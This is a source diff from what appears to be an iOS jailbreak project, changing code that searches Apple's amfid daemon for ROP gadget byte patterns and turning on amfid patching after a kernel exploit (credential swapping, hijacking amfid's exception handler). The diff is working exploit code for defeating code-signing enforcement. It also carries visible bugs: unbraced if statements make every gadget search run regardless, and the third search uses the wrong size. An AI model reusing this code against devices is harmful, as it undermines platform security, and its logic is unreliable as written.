@@ -7,9 +7,9 @@
 
 #import <Foundation/Foundation.h>
 #include "exploit/cicuta/cicuta_virosa.h"
-#include "exploit_utilities.h"
+#include "include/exploit/cicuta/exploit_utilities.h"
 
-#include "utils.h"
+#include "include/lib/tq/utils.h"
 #include "k_utils.h"
 #include "tq_common_p.h"
 #include "kapi.h"
@@ -18,6 +18,7 @@
 #include "util/mach_vm.h"
 
 #include "manticore/amfid.h"
+#include "include/manticore/utils.h"
 
 #include <mach/mach_traps.h>
 #include <mach/vm_region.h>
@@ -102,30 +103,43 @@ uint64_t find_amfid_OFFSET_gadget(uint8_t *amfid_macho){
     const char *_segment = "__TEXT", *_section = "__text";
     const struct section_64 *sect_info = getsectbynamefromheader_64((const struct mach_header_64 *)amfid_macho, _segment, _section);
     if(!sect_info){
-        printf("Error in find_amfid_OFFSET_gadget(): if(!sect_info)\n");
+        fprintf(stderr, "Error in find_amfid_OFFSET_gadget(): if(!sect_info)\n");
+        fprintf(stderr, "Error getting amfid __text section\n");
         exit(1);
     }
+    
     unsigned long sect_size = 0;
     uint64_t sect_data = (uint64_t)getsectiondata((const struct mach_header_64 *)amfid_macho, _segment, _section, &sect_size);
     
     uint64_t _bytes_gadget[] = {
-        0x08, 0x29, 0x09, 0x9B, // madd    x8, x8, x9, x10
-        0x00, 0x15, 0x40, 0xF9, // ldr     x0, [x8, #0x28]
-        0xC0, 0x03, 0x5F, 0xD6, // ret
-    };
-    
-    uint64_t _bytes_gadget2[] = {
-        0x08, 0x25, 0x2A, 0x9B, // smaddl    x8, w8, w10, x9
-        0x00, 0x15, 0x40, 0xF9, // ldr     x0, [x8, #0x28]
-        0xC0, 0x03, 0x5F, 0xD6, // ret
-    };
-    
-    uint64_t find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, &_bytes_gadget, sizeof(_bytes_gadget));
-    if(!find_gadget)
-        find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, &_bytes_gadget2, sizeof(_bytes_gadget2));
-    if(!find_gadget){
-        printf("Error in find_amfid_OFFSET_gadget(): if(!find_gadget)\n");
-    }
+           0x08, 0x29, 0x09, 0x9B, // madd    x8, x8, x9, x10
+           0x00, 0x15, 0x40, 0xF9, // ldr     x0, [x8, #0x28]
+           0xC0, 0x03, 0x5F, 0xD6, // ret
+       };
+       
+       uint64_t _bytes_gadget2[] = {
+           0x08, 0x25, 0x2A, 0x9B, // smaddl    x8, w8, w10, x9
+           0x00, 0x15, 0x40, 0xF9, // ldr     x0, [x8, #0x28]
+           0xC0, 0x03, 0x5F, 0xD6, // ret
+       };
+       
+       uint64_t _bytes_gadget3[] = {
+           0x08, 0xBD, 0x48, 0xCA, // eor        x8, x8, x8, lsr #47
+           0x00, 0x7D, 0x09, 0x9B, // mul        x0, x8, x9
+           0xC0, 0x03, 0x5F, 0xD6, // ret
+       };
+       
+       printf("-> Looking for needle #1...\n");
+       uint64_t find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, &_bytes_gadget, sizeof(_bytes_gadget));
+       if(!find_gadget)
+           printf("-> Looking for needle #2...\n");
+           find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, &_bytes_gadget2, sizeof(_bytes_gadget2));
+       if(!find_gadget)
+           printf("-> Looking for needle #3...\n");
+           find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, &_bytes_gadget3, sizeof(_bytes_gadget2));
+       if(!find_gadget){
+           printf("Error in find_amfid_OFFSET_gadget(): if(!find_gadget)\n");
+       }
     
     return (find_gadget - sect_data) + sect_info->offset;
 }
@@ -282,9 +296,8 @@ kptr_t perform_amfid_patches(){
     /** Finding Amfid related offsets */
     kptr_t amfid_OFFSET_MISValidate_symbol = find_amfid_OFFSET_MISValidate_symbol(amfid_fdata);
     printf("----> MISValidate:\t0x%llx\n", amfid_OFFSET_MISValidate_symbol);
-    // Todo: fix this
-    // kptr_t amfid_OFFSET_gadget = find_amfid_OFFSET_gadget(amfid_fdata);
-    // printf("\t--> Gadget:\t0x%llx\n", amfid_OFFSET_gadget);
+    kptr_t amfid_OFFSET_gadget = find_amfid_OFFSET_gadget(amfid_fdata);
+    printf("----> Gadget:\t\t0x%llx\n", amfid_OFFSET_gadget);
     /** Map amfid to local memory */
     munmap(amfid_fdata, amfid_fsize);
     safepatch_swap_spindump_cred(g_exp.self_proc);
@@ -296,6 +309,6 @@ kptr_t perform_amfid_patches(){
         set_exception_handler(amfid_task_port);
         kptr_t amfid_base = binary_load_address(amfid_task_port);
         printf("amfid base:\t0x%llx\n", amfid_base);
-	} else manticore_error("Could not get amfid's service port!\n");
+    } else manticore_error("Could not get amfid's service port!\n");
     return 0;
 }
